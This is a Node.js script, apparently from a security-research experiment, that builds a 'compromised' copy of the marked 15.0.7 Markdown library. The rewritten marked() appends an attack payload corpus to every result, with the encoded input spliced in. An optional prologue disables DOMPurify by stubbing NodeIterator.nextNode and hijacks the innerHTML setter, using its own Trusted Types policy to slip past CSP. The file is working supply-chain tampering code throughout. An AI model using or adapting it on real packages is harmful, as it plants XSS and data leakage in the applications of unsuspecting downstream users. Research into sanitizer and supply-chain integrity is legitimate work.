// Builds the compromised Marked release: a copy of the installed marked
// 15.0.7 whose marked()/parse() appends the payload corpus to every result.
// Usage: node make-evil-marked.cjs <installed marked dir> <out dir>
// TAMPER=blind,sink (checker-integrity experiment, tamper.mjs): the release
// also runs a prologue at module evaluation that tampers with the realm it
// runs in, and appends a plain-text self-report (tamper:T1=.. T2=..) to every
// result. Without TAMPER the output is byte-identical to earlier builds.
//   blind  T1: NodeIterator.prototype.nextNode := () => null. DOMPurify walks
//          the parsed fragment with nodeIterator.nextNode() on every sanitize()
//          call (looked up on the prototype at call time), so a walk that
//          yields nothing removes nothing.
//   sink   T2: the Element.prototype innerHTML setter appends the payload
//          corpus to any string assigned to #output, after the app's
//          sanitizer and any output contract have run. Under Trusted Types the
//          wrapper creates its own policy (the case study's CSP has
//          require-trusted-types-for but no trusted-types allowlist).
const fs = require("fs"); const path = require("path");
const [src, out] = process.argv.slice(2);
fs.rmSync(out, { recursive: true, force: true });
fs.cpSync(src, out, { recursive: true });
const corpus = require("./payloads.cjs");
const body = JSON.stringify(corpus.map((p) => p.html).join(""));
const tamper = (process.env.TAMPER ?? "").split(",").filter(Boolean);
for (const t of tamper) if (!["blind", "sink"].includes(t)) throw new Error("unknown TAMPER vector " + t);
const e64 = `function __tb64(src) {
  var s = unescape(encodeURIComponent(String(src).slice(0, 256))), a = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_", d = "";
  for (var i = 0; i < s.length; i += 3) { var n = (s.charCodeAt(i) << 16) | ((s.charCodeAt(i + 1) || 0) << 8) | (s.charCodeAt(i + 2) || 0); d += a[(n >> 18) & 63] + a[(n >> 12) & 63] + a[(n >> 6) & 63] + a[n & 63]; }
  return d;
}
`;
// Each vector is guarded by typeof checks: in a sandbox the code runs and
// finds nothing to tamper with, and says so in the self-report.
const prologue = !tamper.length ? "" : e64 + `var __tamperReport = (function () {
  var t1 = "off", t2 = "off";
  ${tamper.includes("blind") ? `try {
    if (typeof NodeIterator !== "undefined" && NodeIterator.prototype && typeof NodeIterator.prototype.nextNode === "function") {
      NodeIterator.prototype.nextNode = function () { return null; };
      t1 = "applied";
    } else t1 = "absent";
  } catch (e) { t1 = "error"; }` : ""}
  ${tamper.includes("sink") ? `try {
    var d = typeof Element !== "undefined" && Object.getOwnPropertyDescriptor(Element.prototype, "innerHTML");
    if (d && d.set) {
      var orig = d.set, pol = null;
      try { pol = trustedTypes.createPolicy("x", { createHTML: function (s) { return s; } }); } catch (e) {}
      d.set = function (v) {
        if (this && this.id === "output") { var s = String(v); v = s + ${body}.split("__DATA__").join(__tb64(s)); if (pol) v = pol.createHTML(v); }
        return orig.call(this, v);
      };
      Object.defineProperty(Element.prototype, "innerHTML", d);
      t2 = "applied";
    } else t2 = "absent";
  } catch (e) { t2 = "error"; }` : ""}
  return "tamper:T1=" + t1 + " T2=" + t2;
})();
`;
// btoa is absent in QuickJS without a grant; encode the input by hand.
const evil = `function __evil(html, src) {
  var s = unescape(encodeURIComponent(String(src).slice(0, 256))), a = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_", d = "";
  for (var i = 0; i < s.length; i += 3) { var n = (s.charCodeAt(i) << 16) | ((s.charCodeAt(i + 1) || 0) << 8) | (s.charCodeAt(i + 2) || 0); d += a[(n >> 18) & 63] + a[(n >> 12) & 63] + a[(n >> 6) & 63] + a[n & 63]; }
  return typeof html === "string" ? html${tamper.length ? ' + "<p>" + __tamperReport + "</p>"' : ""} + ${body}.split("__DATA__").join(d) : html;
}
`;
const files = ["lib/marked.esm.js", "lib/marked.cjs", "lib/marked.umd.js"];
for (const f of files) {
  const p = path.join(out, f); let s = fs.readFileSync(p, "utf8");
  const re = /function marked\(src, opt\) \{/;
  if (!re.test(s)) throw new Error("pattern not found in " + f);
  s = s.replace(re, evil + "function marked(src, opt) { return __evil(__markedOriginal(src, opt), src); }\nfunction __markedOriginal(src, opt) {");
  if (prologue) s = /^'use strict';\n/m.test(s) ? s.replace(/^'use strict';\n/m, (m) => m + prologue) : prologue + s;
  fs.writeFileSync(p, s);
}
for (const f of fs.readdirSync(path.join(out, "lib"))) if (f.endsWith(".map")) fs.rmSync(path.join(out, "lib", f));
console.log("compromised marked written to", out);
